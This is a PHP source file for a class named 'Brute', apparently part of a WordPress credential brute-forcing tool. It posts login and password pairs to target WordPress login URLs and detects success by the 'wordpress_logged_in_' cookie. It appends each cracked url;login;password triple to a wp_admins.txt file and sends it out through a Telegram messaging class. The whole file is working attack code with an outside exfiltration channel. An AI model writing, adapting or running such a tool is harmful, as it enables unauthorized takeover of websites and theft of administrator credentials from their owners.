<?php

namespace app;

use Amp\Dns\DnsException;
use Amp\Http\Client\Body\FormBody;
use Amp\Http\Client\HttpClientBuilder;
use Amp\Http\Client\Request;
use Monolog\Handler\TelegramBotHandler;
use Monolog\Logger;

class Brute
{
    public function __construct()
    {
        $this->client = (new HttpClientBuilder())
            ->retry(3)
            ->followRedirects(2)
            ->build();
    }

    public function __invoke($data)
    {
        $url = explode(';', $data['url'])[0];
        $wp_cookie_login = 'wordpress_logged_in_';

        $login = $this->loginCheck($data);
        $password = $this->passwordCheck($data, $login);
        $iteration = $this->checkIterator($data, $login, $password);
        $authorized = false;

        if ($iteration == true) {
            $log = new Logger('name');

            $body = new FormBody;
            $body->addField('log', $login);
            $body->addField('pwd', $password);

            $request = new Request($url, 'POST');
            $request->setTcpConnectTimeout(2400);
            $request->setBody($body);

            $response = yield $this->client->request($request);
            $cookies = $response->getHeaders()['set-cookie'];

            foreach ($cookies as $cookie) {
                if (str_contains($cookie, $wp_cookie_login))
                    $authorized = true;
            }

//            var_dump([
//                $login,
//                $password,
//                'куки' => $cookies,
//                'авторизация' => $authorized
//            ]);die;

            if ($authorized == true) {
                $wp_admin = "{$url};{$login};{$password}";
                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);

                (new Telegram())->sendMessage($wp_admin);
            }
        }
    }

    public function checkIterator($data, $login, $password) {
        if (( $login == null || $password == null) || ( $data['login'] != '{login}' && $data['login'] == $login )) {
            return false;
        } else {
            return true;
        }
    }

    public function loginCheck($data) {
        if ($data['login'] == '{login}' && !isset(explode(';', $data['url'])[1])) {
            return null;
        } elseif ($data['login'] == '{login}' && isset(explode(';', $data['url'])[1])) {
            return explode(';', $data['url'])[1];
        } else {
            return $data['login'];
        }
    }

    public function passwordCheck($data, $login) {
        if ($data['password'] == '{login}' && $login != null)
            return $this->login;
        else
            return $data['password'];
    }
}